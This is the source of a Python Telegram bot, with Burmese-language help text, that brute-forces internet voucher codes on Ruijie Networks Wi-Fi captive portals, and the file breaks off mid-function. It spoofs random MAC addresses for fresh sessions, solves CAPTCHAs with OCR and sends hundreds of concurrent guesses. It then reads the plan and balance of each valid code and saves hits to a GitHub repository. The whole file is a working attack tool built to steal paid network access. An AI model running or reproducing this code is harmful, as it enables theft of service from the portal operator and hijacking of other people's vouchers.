import telebot, asyncio, aiohttp, json, base64, random, re, os, string, time, uuid
from telebot.async_telebot import AsyncTeleBot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
from aiohttp import web
import cv2
import ddddocr
import numpy as np
from datetime import datetime, timedelta, timezone
import logging

# ⭐ Logging setup
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [%(levelname)s] %(name)s: %(message)s',
    datefmt='%Y-%m-%d %H:%M:%S'
)
log = logging.getLogger("ruijie-bot")

# ── Environment variables ─────────────────────────────────────────────────
BOT_TOKEN = os.environ.get('BOT_TOKEN')
GITHUB_TOKEN = os.environ.get('GITHUB_TOKEN')
ADMIN_ID = os.environ.get('ADMIN_ID')
REPO_OWNER = os.environ.get('REPO_OWNER')
REPO_NAME = os.environ.get('REPO_NAME')

if not BOT_TOKEN:
    raise SystemExit("❌ BOT_TOKEN environment variable not set")

# ── Global structures ─────────────────────────────────────────────────────
TG_MAX_LEN = 4000
SUCCESS_CODE = asyncio.Queue()
bot = AsyncTeleBot(BOT_TOKEN)

user_data = {}
scan_tasks = {}
success_texts = {}
limited_texts = {}
notify_setting = {}
last_scan_params = {}
pending_brute = {}
notify_state = {}

session = None
_connector = None
CONCURRENCY = 300
BATCH_SIZE = 500
_voucher_sem = None
_start_time = time.monotonic()

# ── Portal Configuration ─────────────────────────────────────────────────
PORTAL_CONFIGS = {
    "portal-mm-as": {
        "domain": "portal-mm-as.ruijienetworks.com",
        "base_url": "https://portal-mm-as.ruijienetworks.com",
        "voucher_api": base64.b64decode(b'aHR0cHM6Ly9wb3J0YWwtbW0tYXMucnVpamllbmV0d29ya3MuY29tL2FwaS9hdXRoL3ZvdWNoZXIvP2xhbmc9ZW5fVVM=').decode(),
        "balance_api": "https://portal-mm-as.ruijienetworks.com/api/auth/balance/getBalance",
        "captcha_image_api": "https://portal-mm-as.ruijienetworks.com/api/auth/captcha/image",
        "captcha_verify_api": "https://portal-mm-as.ruijienetworks.com/api/auth/captcha/verify",
        "referer_index": "https://portal-mm-as.ruijienetworks.com/download/static/maccauth/src/index.html?RES=./../expand/res/mrlev58jlgslg49ervu&IS_EG=0&sessionId=",
        "referer_balance": "https://portal-mm-as.ruijienetworks.com/download/static/maccauth/src/balance.html?RES=./../expand/res/4ukmferxbdgmt3m49po&sessionId={token}&lang=en_US&redirectUrl=https://www.ruijienetworks.com&authType=15",
    },
    "portal-as": {
        "domain": "portal-as.ruijienetworks.com",
        "base_url": "https://portal-as.ruijienetworks.com",
        "voucher_api": base64.b64decode(b'aHR0cHM6Ly9wb3J0YWwtYXMucnVpamllbmV0d29ya3MuY29tL2FwaS9hdXRoL3ZvdWNoZXIvP2xhbmc9ZW5fVVM=').decode(),
        "balance_api": "https://portal-as.ruijienetworks.com/api/auth/balance/getBalance",
        "captcha_image_api": "https://portal-as.ruijienetworks.com/api/auth/captcha/image",
        "captcha_verify_api": "https://portal-as.ruijienetworks.com/api/auth/captcha/verify",
        "referer_index": "https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html?RES=./../expand/res/mrlev58jlgslg49ervu&IS_EG=0&sessionId=",
        "referer_balance": "https://portal-as.ruijienetworks.com/download/static/maccauth/src/balance.html?RES=./../expand/res/4ukmferxbdgmt3m49po&sessionId={token}&lang=en_US&redirectUrl=https://www.ruijienetworks.com&authType=15",
    }
}

DEFAULT_PORTAL = "portal-mm-as"

def get_portal_config(session_url=None):
    if session_url:
        if "portal-mm-as" in session_url:
            return PORTAL_CONFIGS["portal-mm-as"], "portal-mm-as"
        elif "portal-as" in session_url:
            return PORTAL_CONFIGS["portal-as"], "portal-as"
    return PORTAL_CONFIGS[DEFAULT_PORTAL], DEFAULT_PORTAL

# ── Helper: send long text in ≤4096-char chunks ──────────────────────────
async def send_chunks(chat_id, text, parse_mode="Markdown", reply_to_message_id=None):
    MAX = 4096
    if len(text) <= MAX:
        await bot.send_message(chat_id, text, parse_mode=parse_mode, reply_to_message_id=reply_to_message_id)
        return
    lines = text.split("\n")
    chunk = ""
    first = True
    for line in lines:
        candidate = chunk + ("\n" if chunk else "") + line
        if len(candidate) > MAX:
            if chunk:
                await bot.send_message(chat_id, chunk, parse_mode=parse_mode, reply_to_message_id=reply_to_message_id if first else None)
                first = False
            chunk = line
        else:
            chunk = candidate
    if chunk:
        await bot.send_message(chat_id, chunk, parse_mode=parse_mode, reply_to_message_id=reply_to_message_id if first else None)

async def _safe_edit(chat_id, message_id, text, parse_mode=None):
    try:
        await bot.edit_message_text(chat_id=chat_id, message_id=message_id, text=text, parse_mode=parse_mode)
        return message_id
    except Exception:
        try:
            sent = await bot.send_message(chat_id, text, parse_mode=parse_mode)
            return sent.message_id
        except Exception:
            return message_id

# ── Web server (keep alive) ────────────────────────────────────────────────
async def handle(request): return web.Response(text="Bot is awake!")
async def web_server():
    app = web.Application()
    app.router.add_get('/', handle)
    runner = web.AppRunner(app)
    await runner.setup()
    port = int(os.environ.get('BOT_PORT', 5000))
    site = web.TCPSite(runner, '0.0.0.0', port)
    await site.start()

# ── GitHub helpers ─────────────────────────────────────────────────────────
async def get_file_content(path):
    url = f"https://api.github.com/repos/{REPO_OWNER}/{REPO_NAME}/contents/{path}"
    headers = {"Authorization": f"token {GITHUB_TOKEN}"}
    try:
        async with session.get(url, headers=headers) as response:
            if response.status == 200:
                data = await response.json()
                content = base64.b64decode(data['content']).decode('utf-8')
                return json.loads(content), data['sha']
    except: pass
    return {}, None

async def update_file_content(path, content, sha, message):
    url = f"https://api.github.com/repos/{REPO_OWNER}/{REPO_NAME}/contents/{path}"
    headers = {"Authorization": f"token {GITHUB_TOKEN}", "Content-Type": "application/json"}
    encoded = base64.b64encode(json.dumps(content).encode()).decode()
    payload = {"message": message, "content": encoded}
    if sha: payload["sha"] = sha
    async with session.put(url, headers=headers, json=payload) as response:
        return await response.text()

# ── Helper functions ───────────────────────────────────────────────────────
PLAN_RE = re.compile(r'^(\d+(mo|min|h|d|m))+$|^unlimit(ed)?$', re.IGNORECASE)

def plan_to_minutes(s):
    if not s: return 0
    s = s.strip().lower()
    if s in ('unlimit', 'unlimited'): return float('inf')
    total = 0
    for val, unit in re.findall(r'(\d+)\s*(mo|min|h|d|m)\b', s):
        val = int(val)
        if unit == 'mo': total += val * 30 * 24 * 60
        elif unit == 'd': total += val * 24 * 60
        elif unit == 'h': total += val * 60
        elif unit in ('min', 'm'): total += val
    return total

def iter_codes(mode, length=None):
    if mode in ["1", "2", "3", "4", "5"]:
        chars_map = {"1": string.digits, "2": string.ascii_lowercase, "3": string.ascii_uppercase, "4": string.ascii_letters, "5": string.ascii_lowercase + string.digits}
        chars = chars_map[mode]
        length = length or 6
        while True: yield "".join(random.choice(chars) for _ in range(length))
    elif mode in ["6", "7"]:
        length = int(mode)
        codes = [str(i).zfill(length) for i in range(10 ** length)]
        random.shuffle(codes)
        yield from codes
    elif mode == "8":
        while True: yield "".join(random.choice(string.digits) for _ in range(8))
    elif mode == "ascii-lower":
        while True: yield "".join(random.choice(string.ascii_lowercase) for _ in range(6))
    elif mode == "all":
        chars = string.ascii_lowercase + string.digits
        while True: yield "".join(random.choice(chars) for _ in range(6))
    else:
        raise ValueError(f"Unsupported scan mode: {mode}")

def format_progress(checked, total=None, speed=0, found=0, target=None):
    lines = ["📋 Status: Running", f"⚡ Speed: {speed:,.0f}/min", f"🔍 Checked: {checked:,}", f"💎 Found: {found}"]
    if target: lines.append(f"🎯 Target: {found}/{target}")
    return "\n".join(lines)

def _parse_seconds(val):
    secs = int(val)
    hours = secs // 3600
    mins = (secs % 3600) // 60
    return f"{hours}h {mins}m" if hours > 0 else (f"{mins}m" if mins > 0 else f"{secs}s")

def _parse_minutes(val):
    total_mins = int(val)
    if total_mins <= 0: return "0m"
    if total_mins < 60: return f"{total_mins}m"
    hours = total_mins // 60
    mins = total_mins % 60
    if hours < 24: return f"{hours}h {mins}m" if mins else f"{hours}h"
    days = hours // 24
    rem_hours = hours % 24
    if days < 30: return f"{days}d {rem_hours}h" if rem_hours else f"{days}d"
    months = days // 30
    rem_days = days % 30
    return f"{months}mo {rem_days}d" if rem_days else f"{months}mo"

def _format_bytes(bytes_val):
    try:
        bytes_val = float(bytes_val)
        if bytes_val >= 1024**3: return f"{bytes_val/(1024**3):.3f} GB"
        elif bytes_val >= 1024**2: return f"{bytes_val/(1024**2):.3f} MB"
        elif bytes_val >= 1024: return f"{bytes_val/1024:.3f} KB"
        else: return f"{bytes_val:.0f} B"
    except: return "N/A"

def _format_quota(used):
    try:
        if isinstance(used, dict):
            up = used.get('up', used.get('upload', 0))
            down = used.get('down', used.get('download', 0))
            total_used = used.get('total', up + down)
            used_str = _format_bytes(total_used)
            return f"{used_str}({_format_bytes(up)}↑ / {_format_bytes(down)}↓)" if up and down else used_str
        return _format_bytes(used)
    except: return "N/A"

async def get_balance(token, portal_config):
    url = f"{portal_config['balance_api']}/{token}"
    cookies = {
        'sensorsdata2015jssdkcross': '%7B%22distinct_id%22%3A%2219e460ef444507-091ef90c028745-1e462c6e-343089-19e460ef4452ab%22%2C%22first_id%22%3A%22%22%2C%22props%22%3A%7B%22%24latest_traffic_source_type%22%3A%22%E7%9B%B4%E6%8E%A5%E6%B5%81%E9%87%8F%22%2C%22%24latest_search_keyword%22%3A%22%E6%9C%AA%E5%8F%96%E5%88%B0%E5%80%BC_%E7%9B%B4%E6%8E%A5%E6%89%93%E5%BC%80%22%2C%22%24latest_referrer%22%3A%22%22%7D%2C%22identities%22%3A%22eyIkaWRlbnRpdHlfY29va2llX2lkIjoiMTllNDYwZWY0NDQ1MDctMDkxZWY5MGMwMjg3NDUtMWU0NjJjNmUtMzQzMDg5LTE5ZTQ2MGVmNDQ1MmFiIn0%3D%22%2C%22history_login_id%22%3A%7B%22name%22%3A%22%22%2C%22value%22%3A%22%22%7D%2C%22%24device_id%22%3A%2219e460ef444507-091ef90c028745-1e462c6e-343089-19e460ef4452ab%22%7D',
    }
    headers = {
        'authority': portal_config['domain'], 'accept': 'application/json, text/javascript, */*; q=0.01',
        'content-type': 'application/json;', 'referer': portal_config['referer_balance'].format(token=token),
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }
    try:
        async with session.get(url, headers=headers, cookies=cookies, timeout=aiohttp.ClientTimeout(total=8)) as resp:
            raw = await resp.text()
            if resp.status != 200:
                alt_url = f"{portal_config['base_url']}/api/macc2/balance/getBalance/{token}"
                async with session.get(alt_url, headers=headers, cookies=cookies, timeout=8) as alt_resp:
                    raw = await alt_resp.text()
                    if alt_resp.status != 200: return {"time": "N/A", "usage": "N/A", "quota": "N/A", "plan": "N/A", "expire": "N/A"}
            data = json.loads(raw)
            result = {"time": "N/A", "usage": "N/A", "quota": "N/A", "plan": "N/A", "expire": "N/A"}
            candidates = [data] + [data.get(k) for k in ['result', 'data'] if isinstance(data.get(k), dict)]
            for d in candidates:
                if not isinstance(d, dict): continue
                for key in ['totalMinutes', 'remainingMinutes', 'remainMinutes', 'leftMinutes', 'balance', 'remaining']:
                    if d.get(key) is not None: result["time"] = _parse_minutes(d[key]); break
                for key in ['remainingSeconds', 'remainTime', 'remainingTime', 'leftTime', 'timeLeft']:
                    if d.get(key) is not None: result["time"] = _parse_seconds(d[key]); break
                usage = d.get('usage') or d.get('dataUsage') or d.get('traffic')
                if usage: result["usage"] = _format_quota(usage)
                quota = d.get('quota') or d.get('dataQuota') or d.get('limit')
                if d.get('sessionQuota') and d.get('totalQuota'): result["quota"] = f"{_format_bytes(d['sessionQuota'])} / {_format_bytes(d['totalQuota'])}"
                elif quota: result["quota"] = _format_bytes(quota)
                for key in ['plan', 'planName', 'internetPlan', 'package', 'productName', 'planInfo', 'product']:
                    if d.get(key): result["plan"] = str(d[key]); break
                for key in ['expireTime', 'expiration', 'expire', 'validUntil', 'endTime', 'expireDate']:
                    if d.get(key): result["expire"] = str(d[key]); break
            return result
    except: return {"time": "N/A", "usage": "N/A", "quota": "N/A", "plan": "N/A", "expire": "N/A"}

# ── Captcha handling ───────────────────────────────────────────────────────
_ocr = ddddocr.DdddOcr(show_ad=False)
def _ocr_sync(image_bytes):
    nparr = np.frombuffer(image_bytes, np.uint8)
    img = cv2.imdecode(nparr, cv2.IMREAD_COLOR)
    if img is None: return None
    gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)
    blur = cv2.GaussianBlur(gray, (3, 3), 0)
    _, thresh = cv2.threshold(blur, 0, 255, cv2.THRESH_BINARY + cv2.THRESH_OTSU)
    _, buffer = cv2.imencode('.png', thresh)
    return _ocr.classification(buffer.tobytes()).upper()

async def Captcha_Text(image_bytes): return await asyncio.to_thread(_ocr_sync, image_bytes)

def get_mac(): return ':'.join(f'{x:02x}' for x in [random.choice([0x02, 0x06, 0x0A, 0x0E])] + [random.randint(0, 255) for _ in range(5)])
def replace_mac(url, new_mac): return re.sub(r'(?<=mac=)[^&]+', new_mac, url)

async def get_session_id(session_obj, session_url, previous_session_id=None):
    # ⭐ Wifidog URL ဖြစ်ရင် MAC မပြောင်းတော့ပါ
    if "wifidog" in session_url: url = session_url
    else: url = replace_mac(session_url, new_mac=get_mac())
    
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'referer': url,
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36 Edg/148.0.0.0',
    }
    try:
        async with session_obj.get(url, headers=headers, allow_redirects=True, timeout=10) as req:
            response = str(req.url)
            sid = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", response)
            return sid.group(1) if sid else previous_session_id
    except: return previous_session_id

async def Captcha_Image(session_obj, session_id, portal_config):
    headers = {'referer': portal_config['referer_index'] + session_id, 'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36'}
    params = {'sessionId': session_id, '_t': str(time.time())}
    async with session_obj.get(portal_config['captcha_image_api'], params=params, headers=headers) as req:
        return await req.read()

async def Varify_Captcha(session_obj, session_id, text, portal_config):
    headers = {'content-type': 'application/json', 'origin': portal_config['base_url'], 'referer': portal_config['referer_index'] + session_id, 'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36'}
    async with session_obj.post(portal_config['captcha_verify_api'], headers=headers, json={'sessionId': session_id, 'authCode': text}) as req:
        data = await req.json()
        return session_id if data.get("success") == True else None

async def check_session_url(session_url):
    try:
        from urllib.parse import urlparse, parse_qs
        parsed = urlparse(session_url)
        params = parse_qs(parsed.query)
        if "wifidog" in session_url: return all(k in params for k in ['gw_id', 'gw_address', 'gw_port', 'mac', 'ip'])
        else: return "sessionId" in session_url
    except: return False

# ── Core voucher check ─────────────────────────────────────────────────────
async def perform_check(session_url, code, chat_id, scan_id=None, recheck=False, message=None, plan_filters=None):
    global _connector
    if not recheck:
        current_task = scan_tasks.get(chat_id)
        if not current_task or current_task.get("scan_id") != scan_id: return

    portal_config, portal_name = get_portal_config(session_url)
    post_url = portal_config['voucher_api']
    response = None
    session_id = None

    for attempt in range(3):
        timeout = aiohttp.ClientTimeout(total=20)
        async with aiohttp.ClientSession(connector=_connector, connector_owner=False, cookie_jar=aiohttp.CookieJar(), timeout=timeout) as task_session:
            session_id = await get_session_id(task_session, session_url)
            if not session_id: continue

            auth_code = None
            for _ in range(5):
                try:
                    image = await Captcha_Image(task_session, session_id, portal_config)
                    text = await Captcha_Text(image)
                    if not text: continue
                    if await Varify_Captcha(task_session, session_id, text, portal_config):
                        auth_code = text
                        break
                except: continue
            if not auth_code: continue

            if not recheck:
                current_task = scan_tasks.get(chat_id)
                if not current_task or current_task.get("scan_id") != scan_id or current_task.get("stop"): return

            data = {"accessCode": code, "sessionId": session_id, "apiVersion": 1, "authCode": auth_code}
            headers = {
                "authority": portal_config['domain'], "accept": "*/*", "content-type": "application/json",
                "origin": portal_config['base_url'], "referer": portal_config['referer_index'] + session_id,
                "user-agent": "Mozilla/5.0 (Linux; Android 12; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
            }
            try:
                async with task_session.post(post_url, json=data, headers=headers) as req:
                    response = await req.text()
            except: continue

        if response and 'request limited' in response:
            await asyncio.sleep(random.uniform(0.5, 1.5))
            continue
        break

    if not response: return

    if 'logonUrl' in response:
        if recheck: return code

        plan_str, usage_str, quota_str, expire_str = "N/A", "N/A", "N/A", "N/A"
        try:
            res_data = json.loads(response)
            logon_url = res_data.get("result", {}).get("logonUrl", "") if isinstance(res_data, dict) else ""
            token_match = re.search(r'token=(.*?)&', logon_url)
            token = token_match.group(1) if token_match else session_id
            
            balance_info = await get_balance(token, portal_config)
            if isinstance(balance_info, dict):
                plan_str = balance_info.get("time", "N/A")
                usage_str = balance_info.get("usage", "N/A")
                quota_str = balance_info.get("quota", "N/A")
                expire_str = balance_info.get("expire", "N/A")
                if balance_info.get("plan") != "N/A": plan_str = balance_info.get("plan")
        except: pass

        if plan_filters:
            code_mins = plan_to_minutes(plan_str)
            if not any(code_mins >= plan_to_minutes(f) for f in plan_filters): return None

        if chat_id not in success_texts: success_texts[chat_id] = []
        success_texts[chat_id].append({
            "code": code, "session_id": session_id, "plan": plan_str,
            "usage": usage_str, "quota": quota_str, "expire": expire_str, "portal": portal_name
        })

        await SUCCESS_CODE.put({"chat_id": chat_id, "code": code, "session_id": session_id, "plan": plan_str, "usage": usage_str, "quota": quota_str})

        if notify_setting.get(chat_id, False) and message:
            try:
                items = success_texts[chat_id]
                n = len(items)
                pages = notify_state.get(chat_id) or []
                MAX = 4096

                def build_page_text(first_idx):
                    lines = []
                    for it in items[first_idx:]:
                        line = f"`{it['code']}` – ⏳ {it.get('plan','N/A')}"
                        if it.get('usage') and it['usage'] != 'N/A': line += f" | 📊 {it['usage']}"
                        if it.get('quota') and it['quota'] != 'N/A': line += f" | 💾 {it['quota']}"
                        lines.append(line)
                    header = f"✅ Success Codes ({n}):\n" if first_idx == 0 else f"✅ Success Codes (cont.):\n"
                    return header + "\n".join(lines)

                if not pages:
                    text = build_page_text(0)
                    sent = await bot.send_message(chat_id, text, parse_mode="Markdown")
                    notify_state[chat_id] = [{"msg_id": sent.message_id, "first_idx": 0}]
                else:
                    last_page = pages[-1]
                    first_idx = last_page["first_idx"]
                    new_text = build_page_text(first_idx)
                    if len(new_text) <= MAX:
                        try: await bot.edit_message_text(chat_id=chat_id, message_id=last_page["msg_id"], text=new_text, parse_mode="Markdown")
                        except:
                            sent = await bot.send_message(chat_id, new_text, parse_mode="Markdown")
                            pages[-1] = {"msg_id": sent.message_id, "first_idx": first_idx}
                            notify_state[chat_id] = pages
                    else:
                        new_page_text = f"✅ Success Codes (cont. {n}):\n`{code}` – ⏳ {plan_str}"
                        sent = await bot.send_message(chat_id, new_page_text, parse_mode="Markdown")
                        pages.append({"msg_id": sent.message_id, "first_idx": n - 1})
                        notify_state[chat_id] = pages
            except: pass
        return code

    elif 'STA' in response:
        if chat_id not in limited_texts: limited_texts[chat_id] = []
        limited_texts[chat_id].append(code)
        if notify_setting.get(chat_id, False) and message:
            try:
                full = "⚠️ Limited Codes:\n" + "\n".join(limited_texts[chat_id])
                if chat_id not in limited_messages:
                    sent = await bot.send_message(chat_id, full)
                    limited_messages[chat_id] = sent.message_id
                else:
                    await bot.edit_message_text(chat_id=chat_id, message_id=limited_messages[chat_id], text=full)
            except: pass

# ── Brute-force runner ─────────────────────────────────────────────────────
success_messages = {}
limited_messages = {}

async def run_bruteforce(mode, length, chat_id, session_url, scan_id, target=None, message=None, progress_msg=None, plan_filters=None):
    try: code_iter = iter_codes(mode, length)
    except ValueError as e:
        await bot.send_message(chat_id, str(e))
        return

    total = 10 ** int(mode) if mode in ["6", "7"] else None
    checked, found = 0, 0
    scan_start = time.monotonic()

    global _voucher_sem
    if _voucher_sem is None: _voucher_sem = asyncio.Semaphore(CONCURRENCY)

    try:
        while True:
            current_task = scan_tasks.get(chat_id)
            if not current_task or current_task.get("scan_id") != scan_id: return
            if current_task.get("stop"):
                last_scan_params[chat_id] = {"mode": mode, "length": length, "target": target, "plan_filters": plan_filters or []}
                scan_tasks.pop(chat_id, None)
                return

            batch = []
            try:
                for _ in range(BATCH_SIZE): batch.append(next(code_iter))
            except StopIteration: break
            if not batch: break

            async def _check(code):
                async with _voucher_sem:
                    return await perform_check(session_url, code, chat_id, scan_id, message=message, plan_filters=plan_filters)

            results = await asyncio.gather(*[_check(code) for code in batch], return_exceptions=True)

            for res in results:
                if res:
                    found += 1
                    if target and found >= target:
                        if progress_msg: await _safe_edit(chat_id, progress_msg.message_id, "🎯 Target reached!")
                        scan_tasks.pop(chat_id, None)
                        last_scan_params.pop(chat_id, None)
                        return

            checked += len(batch)
            elapsed = time.monotonic() - scan_start
            speed = (checked / elapsed * 60) if elapsed > 0 else 0
            text = format_progress(checked, total, speed, found, target)
            
            if progress_msg: progress_msg.message_id = await _safe_edit(chat_id, progress_msg.message_id, text)

        if progress_msg: await _safe_edit(chat_id, progress_msg.message_id, "✅ Scan completed.")
        scan_tasks.pop(chat_id, None)
    finally: scan_tasks.pop(chat_id, None)

# ── GitHub update scheduler ────────────────────────────────────────────────
async def github_update_scheduler():
    while True:
        await asyncio.sleep(80)
        items = []
        while not SUCCESS_CODE.empty(): items.append(await SUCCESS_CODE.get())
        if items:
            try:
                results, sha = await get_file_content("result.json")
                for item in items:
                    chat_id = str(item["chat_id"])
                    if chat_id not in results: results[chat_id] = []
                    existing = [e["code"] if isinstance(e, dict) else e for e in results[chat_id]]
                    if item["code"] not in existing:
                        results[chat_id].append({"code": item["code"], "session_id": item.get("session_id", ""), "plan": item.get("plan", "N/A")})
                await update_file_content("result.json", results, sha, "Periodic Update")
            except: pass

STATE_FILE = "state.json"

def save_state():
    try:
        with open(STATE_FILE, "w") as f:
            json.dump({"user_data": {str(k): v for k, v in user_data.items()}, "notify_setting": {str(k): v for k, v in notify_setting.items()}, "last_scan_params": {str(k): v for k, v in last_scan_params.items()}}, f)
    except: pass

def load_state():
    if not os.path.exists(STATE_FILE): return
    try:
        with open(STATE_FILE) as f: payload = json.load(f)
        for k, v in payload.get("user_data", {}).items(): user_data[int(k)] = v
        for k, v in payload.get("notify_setting", {}).items(): notify_setting[int(k)] = v
        for k, v in payload.get("last_scan_params", {}).items(): last_scan_params[int(k)] = v
    except: pass

async def load_saved_results():
    try:
        results, _ = await get_file_content("result.json")
        for chat_id_str, entries in results.items():
            try: cid = int(chat_id_str)
            except: continue
            if cid not in success_texts: success_texts[cid] = []
            for entry in entries:
                code = entry.get("code", "") if isinstance(entry, dict) else str(entry)
                sid = entry.get("session_id", "") if isinstance(entry, dict) else ""
                plan = entry.get("plan", "N/A") if isinstance(entry, dict) else "N/A"
                if not any(e["code"] == code for e in success_texts[cid]):
                    success_texts[cid].append({"code": code, "session_id": sid, "plan": plan})
    except: pass

# ── Bot commands ───────────────────────────────────────────────────────────
@bot.message_handler(commands=['start'])
async def start(message): await bot.reply_to(message, "Bot စတင်ပါပြီ။ /help ဖြင့် အသုံးပြုနည်းကြည့်ပါ။")

@bot.message_handler(commands=['help'])
async def help_cmd(message):
    help_text = (
        "📚 **Command လမ်းညွှန်**\n\n"
        "၁။ **Setup**:\n"
        "   /setup <url>\n\n"
        "၂။ **ရှာဖွေခြင်း**:\n"
        "   /brute <mode> <length> [target] [plan]\n"
        "   Mode:\n"
        "     1-5 = ဂဏန်း/စာလုံးများ (length ထည့်ရမည်)\n"
        "     6-7 = ဂဏန်း 6 လုံး/7 လုံး (length မလိုပါ)\n"
        "     8   = ဂဏန်း 8 လုံး\n"
        "     all = စာလုံး+ဂဏန်း\n"
        "   ဥပမာ - /brute 1 6 5 (mode1, len6, target5)\n"
        "   ဥပမာ - /brute 6 10 1d 1mo (mode6, target10, plan 1d/1mo)\n\n"
        "၃။ /status  – အခြေအနေကြည့်\n"
        "၄။ /stop    – ရပ်တန့်ခြင်း\n"
        "၅။ /resume  – ဆက်ရှာဖွေခြင်း\n"
        "၆။ /saved   – ရလဒ်ကြည့်ခြင်း\n"
        "၇။ /notify  – Notification ON/OFF\n"
        "၈။ /recheck – Success codes ပြန်စစ်ခြင်း"
    )
    await bot.reply_to(message, help_text, parse_mode="Markdown")

@bot.message_handler(commands=['setup'])
async def handle_setup(message):
    args = message.text.split(maxsplit=1)
    if len(args) < 2: return await bot.reply_to(message, "အသုံးပြုနည်း:\n/setup your_session_url")
    url = args[1]
    
    await bot.reply_to(message, "Session URL စစ်ဆေးနေပါသည်...")
    if await check_session_url(url):
        cid = message.chat.id
        if cid in scan_tasks:
            task_info = scan_tasks.pop(cid, None)
            if task_info and task_info.get("task"): task_info["task"].cancel()

        user_data.setdefault(cid, {})['session_url'] = url
        for d in [success_texts, limited_texts, last_scan_params, pending_brute, success_messages, limited_messages, notify_state]: d.pop(cid, None)

        try:
            results, sha = await get_file_content("result.json")
            if str(cid) in results:
                del results[str(cid)]
                await update_file_content("result.json", results, sha, f"Clear codes for {cid}")
        except: pass

        save_state()
        await bot.reply_to(message, "✅ Session URL သိမ်းဆည်းပြီးပါပြီ။\n/brute ဖြင့် စတင်ပါ။")
    else: await bot.reply_to(message, "Session URL မှားယွင်းနေပါသည်။")

@bot.message_handler(commands=['brute'])
async def brute(message):
    args = message.text.split()
    if len(args) < 2: return await bot.reply_to(message, "အသုံးပြုနည်း:\n/brute <mode> <length> [target] [plan]")

    mode = args[1]
    length, target, plan_filters = None, None, []
    
    if mode in ["1", "2", "3", "4", "5"]:
        if len(args) < 3: return await bot.reply_to(message, f"Mode {mode} အတွက် Length ထည့်ရပါမည်။\nဥပမာ: /brute {mode} 6")
        try:
            length = int(args[2])
            idx = 3
        except: return await bot.reply_to(message, "Length သည် ဂဏန်းဖြစ်ရပါမည်။")
    else:
        idx = 2

    if idx < len(args) and not PLAN_RE.match(args[idx]):
        try: target = int(args[idx]); idx += 1
        except: return await bot.reply_to(message, "Target သည် ဂဏန်းဖြစ်ရပါမည်။")

    for arg in args[idx:]:
        if PLAN_RE.match(arg): plan_filters.append(arg)
        else: return await bot.reply_to(message, f"'{arg}' သည် plan ပုံစံမမှန်ပါ။")

    chat_id = message.chat.id
    if chat_id not in user_data or 'session_url' not in user_data[chat_id]: return await bot.reply_to(message, "/setup ဖြင့် Session URL ထည့်ပါ။")

    if chat_id in last_scan_params:
        markup = InlineKeyboardMarkup().add(InlineKeyboardButton("Resume", callback_data="resume_scan"), InlineKeyboardButton("New Scan", callback_data="new_scan"))
        pending_brute[chat_id] = {"mode": mode, "length": length, "target": target, "plan_filters": plan_filters}
        return await bot.reply_to(message, "ယခင် scan ရပ်ထားသည်။ ပြန်စမလား၊ အသစ်စမလား?", reply_markup=markup)

    await start_brute_scan(chat_id, mode, length, target, message, plan_filters=plan_filters)

async def start_brute_scan(chat_id, mode, length, target, original_message, plan_filters=None):
    progress_msg = await bot.send_message(chat_id, "Preparing...")
    scan_id = str(uuid.uuid4())
    task = asyncio.create_task(run_bruteforce(mode, length, chat_id, user_data[chat_id]['session_url'], scan_id, target, message=original_message, progress_msg=progress_msg, plan_filters=plan_filters))
    scan_tasks[chat_id] = {"task": task, "stop": False, "scan_id": scan_id, "mode": mode, "length": length, "target": target, "plan_filters": plan_filters}
    success_messages.pop(chat_id, None); limited_messages.pop(chat_id, None)

@bot.message_handler(commands=['stop'])
async def stop_scan(message):
    chat_id = message.chat.id
    data = scan_tasks.get(chat_id)
    if data:
        data["stop"] = True
        last_scan_params[chat_id] = {"mode": data.get("mode"), "length": data.get("length"), "target": data.get("target"), "plan_filters": data.get("plan_filters", [])}
        if not data["task"].done(): data["task"].cancel()
        await bot.reply_to(message, "Scan ရပ်ထားပါသည်။ /resume ဖြင့် ဆက်လုပ်ပါ။")
    else: await bot.reply_to(message, "ရပ်ရန် scan မရှိပါ။")

@bot.message_handler(commands=['resume'])
async def resume_scan(message):
    chat_id = message.chat.id
    if chat_id not in last_scan_params: return await bot.reply_to(message, "ယခင်ရပ်ထားသော scan မရှိပါ။")
    params = last_scan_params.pop(chat_id)
    await start_brute_scan(chat_id, params['mode'], params.get('length'), params.get('target'), message, plan_filters=params.get('plan_filters', []))
    await bot.reply_to(message, "ယခင် scan ပြန်စပါပြီ။")

@bot.callback_query_handler(func=lambda call: call.data in ["resume_scan", "new_scan"])
async def handle_resume_callback(call):
    chat_id = call.message.chat.id
    await bot.answer_callback_query(call.id)
    if call.data == "resume_scan":
        if chat_id not in last_scan_params: return await bot.edit_message_text("Resume လုပ်ရန် scan မရှိပါ။", chat_id=chat_id, message_id=call.message.message_id)
        params = last_scan_params.pop(chat_id)
        await bot.edit_message_text("ယခင် scan ပြန်စပါပြီ။", chat_id=chat_id, message_id=call.message.message_id)
        await start_brute_scan(chat_id, params['mode'], params.get('length'), params.get('target'), call.message, plan_filters=params.get('plan_filters', []))
    else:
        if chat_id in pending_brute:
            params = pending_brute.pop(chat_id); last_scan_params.pop(chat_id, None)
            await bot.edit_message_text("Scan အသစ်စတင်ပါပြီ။", chat_id=chat_id, message_id=call.message.message_id)
            await start_brute_scan(chat_id, params['mode'], params.get('length'), params.get('target'), call.message, plan_filters=params.get('plan_filters', []))
        else: await bot.edit_message_text("Command ထပ်မံပေးပို့ပါ။", chat_id=chat_id, message_id=call.message.message_id)

@bot.message_handler(commands=['saved'])
async def saved_codes(message):
    chat_id = message.chat.id
